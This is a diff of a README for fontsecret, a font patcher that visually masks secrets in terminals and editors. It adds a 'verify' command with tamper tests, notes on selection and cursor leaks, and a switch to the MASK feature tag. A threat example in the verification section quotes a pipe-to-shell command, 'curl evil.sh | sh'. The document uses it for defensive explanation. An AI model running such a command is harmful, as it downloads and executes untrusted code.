@@ -18,8 +18,9 @@ files, shell history and the accessibility tree still hold the real characters.
 ```sh
 mise install && uv sync
 ./scripts/build-samples.sh    # downloads OFL fonts into fonts/ and patches them
-uv run pytest                 # 62 tests, shaping with HarfBuzz
-uv run python -m fontsecret IN.ttf OUT.ttf --always-on --suffix Masked
+uv run pytest                 # 78 tests, shaping with HarfBuzz
+uv run python -m fontsecret patch IN.ttf OUT.ttf --always-on --suffix Masked
+uv run python -m fontsecret verify IN.ttf OUT.ttf
 ```
 
 ## How the masking works
@@ -46,8 +47,9 @@ fontsecret follows the same split: `--always-on` or an opt-in feature.
    rules come before marker rules, so a trigger inside a masked run can't restart it. (The
    `.eyJ` partway through a JWT revealed 4 characters before this.)
 2. `fontsecret/font.py` adds the dot and marker glyphs. It supports `glyf` and `CFF`, static
-   and variable. Markers copy their source glyph's bytes and `gvar` deltas, so they
-   interpolate exactly. Glyphs the patcher didn't add are never re-encoded: Iosevka only
+   and variable. Each marker copies the bytes and `gvar` deltas of the exact glyph it
+   replaces, so it draws and interpolates the same. (OpenDyslexic's U+00A0 is twice as wide
+   as its space, so it gets its own marker.) Glyphs the patcher didn't add are never re-encoded: Iosevka only
    passes OTS in its original encoding.
 3. The lookup is prepended to the font's GSUB, and every existing lookup reference is
    shifted. Masking therefore runs before the font's own ligatures and alternates and sees
@@ -66,6 +68,32 @@ Where fontsecret differs from Obel Mono Masked:
 | `password=hunter22` | visible | `password=hunt••••` | Passwords often start with a word, so password names never use the word filter. |
 | `token: Abcd1234zz` | visible | `token: Abcd••••••` | `name: ` is a trigger for key names. The word filter keeps `token: string` visible. |
 
+## Checking a patched font
+
+A font decides what text looks like, so a modified font could draw `ls` where the text says
+`curl evil.sh | sh`. `fontsecret verify ORIGINAL PATCHED` checks that a patched font differs
+from its original only by masking:
+
+- Every original glyph keeps its outline bytes, variation data and metrics, and every
+  character keeps its glyph (`cmap`).
+- Added glyphs are dots (one shape, inside one cell) or copies that draw exactly like an
+  original glyph.
+- Every original lookup, feature and script is unchanged, apart from the added masking
+  feature.
+- Added lookups only replace a glyph with a dot, or with a copy that draws and varies exactly
+  like the glyph it replaces.
+- Every other table is byte-identical. The exceptions are fields that must change when glyphs
+  are added, such as `hhea.numberOfHMetrics`.
+
+`tests/test_verify.py` makes six hostile edits to a patched font, on both the glyf and CFF
+builds, and checks `verify` rejects each one: remapping `l` to `s` in `cmap`, redrawing `a`
+as `o`, a marker that draws as a different glyph, an added substitution of `a` with `b`, an
+edited original lookup, and an opt-in lookup attached to an always-on feature.
+
+Run across the 71 Nerd Fonts families, `verify` found three patcher bugs, all fixed. A
+non-breaking space was replaced by a copy of a narrower space, and the patcher rewrote
+`cmap` and `OS/2` instead of keeping their bytes.
+
 ## Verification
 
 - **Tests** (`tests/test_masking.py`, on variable Cascadia Code and CFF Source Code Pro):
@@ -73,28 +101,55 @@ Where fontsecret differs from Obel Mono Masked:
   - No redraws: for 324 lines, every prefix draws as the start of the whole line. A
     planted lookahead rule fails this test.
   - Plain code shapes exactly as in the original font, under each of the original's features.
-  - Every output passes OTS.
+  - Every output passes OTS and `fontsecret verify` (`tests/test_verify.py`).
 - **Every Nerd Fonts family:** `scripts/survey.py` ran the same checks on one face of each of
-  the 71 families in Nerd Fonts' `src/unpatched-fonts/`. All 71 pass
+  the 71 families in Nerd Fonts' `src/unpatched-fonts/`, plus `verify`. All 71 pass
   ([table](docs/nerd-fonts-survey.md)).
 - **CoreText:** `scripts/coretext_check.swift` shapes with the macOS engine and matches
-  HarfBuzz ([render](docs/coretext-smsk.png)).
+  HarfBuzz ([render](docs/coretext-mask.png)).
 - **Real apps**, captured with [agent-desktop](https://github.com/vercel-labs/agent-desktop):
 
   | App | Build | Result |
   |---|---|---|
-  | Ghostty 1.3.1 | `font-feature = +SMSK` | Masked ([capture](docs/real-ghostty-smsk.png)) |
+  | Ghostty 1.3.1 | `font-feature = +MASK` | Masked ([capture](docs/real-ghostty-mask.png)) |
   | TextEdit | always on | Masked ([capture](docs/real-textedit-masked.png)) |
   | TextEdit, typing one key every 200 ms | always on | No frame showed more than the 4 kept characters ([frames](docs/real-textedit-typing.png)) |
-  | VS Code | `editor.fontLigatures: "'SMSK', 'calt'"` | Masked in `.env` ([capture](docs/real-vscode-env.png)) and JSON ([before and after the U+00A0 fix](docs/real-vscode-nbsp-fix.png)) |
+  | VS Code | `editor.fontLigatures: "'MASK', 'calt'"` | Masked in `.env` ([capture](docs/real-vscode-env.png)) and in JSON, with and without a space after the colon ([capture](docs/real-vscode-json.png)) |
 
 DirectWrite (Windows), iTerm2 and Terminal.app are untested.
+
+## Selecting text and the cursor
+
+Selecting text paints a background behind glyphs that are already shaped, so selection alone
+doesn't reveal anything. The risk is an app that shapes the text on each side of a selection
+edge, or of the cursor, as separate runs. The rules only look backwards, so the part after
+the split has no marker behind it and draws as typed.
+
+![A selection that starts inside the first key, in Ghostty, TextEdit and VS Code](docs/demo/selection.png)
+
+The selection starts inside the dots of the first key and ends after the password line.
+
+| App | Selection starting inside a key | Select all | Cursor inside a key |
+|---|---|---|---|
+| Ghostty 1.3.1 | **Shows the selected part of the key** ([video](docs/demo/ghostty.mp4)) | Masked | **Shows the key from the cursor on**, unless `font-shaping-break = no-cursor` |
+| TextEdit | Masked ([video](docs/demo/textedit.mp4)) | Masked | Masked |
+| VS Code | Masked, the selected dots only change colour ([video](docs/demo/vscode.mp4)) | Masked | Masked |
+
+![Ghostty with the cursor inside a key: default, then font-shaping-break = no-cursor](docs/demo/cursor.png)
+
+Ghostty splits shaping runs under the cursor by default (`font-shaping-break = cursor`) so
+that you can see the individual characters of a ligature you're editing. Setting
+`font-shaping-break = no-cursor` keeps a key masked with the cursor inside it. No setting
+stops the split at a selection edge. A fix belongs in Ghostty: shaping each run with the
+text before it as context (HarfBuzz supports this) would keep the marker visible to the
+rules. Obel Mono uses the same rules, so it shows the same behaviour.
 
 ## Limits
 
 - Masking changes pixels, not text. Anything that reads the text gets the secret. That
   includes AI agents reading the accessibility tree. Rotate a key that has been shown.
-- It works within one shaping run. A key that wraps shows on its second line. Terminals that
+- It works within one shaping run. A key that wraps shows on its second line. In Ghostty, a
+  selection edge or the cursor inside a key shows the rest of it (see above). Terminals that
   don't shape text, like Alacritty, show everything.
 - Text typed before existing text on the same line joins the open key until the line ends.
 - On macOS, CoreText uses a font's AAT `morx` table instead of GSUB. ProFont is the only
@@ -108,15 +163,22 @@ DirectWrite (Windows), iTerm2 and Terminal.app are untested.
 `ss01` can't be a shared convention. 30 of the 71 Nerd Fonts families already use it, and
 every tag from `ss01` to `ss20` is used by at least one family.
 
-The OpenType spec reserves four uppercase letters for private features. `--feature SMSK`
-works in HarfBuzz, CoreText, Ghostty and VS Code, and passes OTS. A private tag can't carry
-a display name, unlike `ssNN`.
+fontsecret uses the private tag `MASK`. The OpenType spec reserves four uppercase letters
+for private features, and registered tags are lowercase, so a private tag can't collide with
+a future registered one. There's no prefix convention like HTTP's `X-`. Fonts that use
+private tags name them with a 4-letter abbreviation instead: Iosevka uses `HSKL` for its Haskell
+ligature set and `JSPT` for JavaScript. None of the 71 Nerd Fonts families uses `MASK`.
+
+`--feature MASK` works in HarfBuzz, CoreText, Ghostty and VS Code, and passes OTS. Tags are
+case-sensitive: lowercase `mask` does nothing. A private tag can't carry a display name,
+unlike `ssNN`.
 
 The path to a standard tag:
 
-1. Ship a private tag and an always-on (`ccmp`) build.
-2. Ask Cody Collier to add the same tag to Obel Mono.
-3. Nominate a registered lowercase tag to Microsoft, with both fonts as evidence.
+1. Ship `MASK` and an always-on (`ccmp`) build.
+2. Ask Cody Collier to add `MASK` to Obel Mono.
+3. Nominate lowercase `mask` to Microsoft's registry, with both fonts as evidence. It isn't
+   registered yet.
 
 ## Nerd Fonts
 
@@ -146,8 +208,9 @@ Questions for that issue:
 
 - `patterns.toml`: triggers, charsets and their sources.
 - `fontsecret/`: `patterns.py` loads patterns, `fea.py` generates the rules, `font.py`
-  patches the font, `__main__.py` is the CLI.
-- `tests/`: HarfBuzz shaping tests.
+  patches the font, `verify.py` checks a patched font, `__main__.py` is the CLI.
+- `tests/`: HarfBuzz shaping tests and `verify` tamper tests.
+- `docs/demo/`: selection and cursor recordings.
 - `scripts/build-samples.sh`: downloads and patches the sample fonts.
 - `scripts/fetch-nerd-fonts.sh`, `scripts/survey.py`: the Nerd Fonts survey.
 - `scripts/real-apps.sh`, `scripts/coretext_check.swift`: macOS app tests.
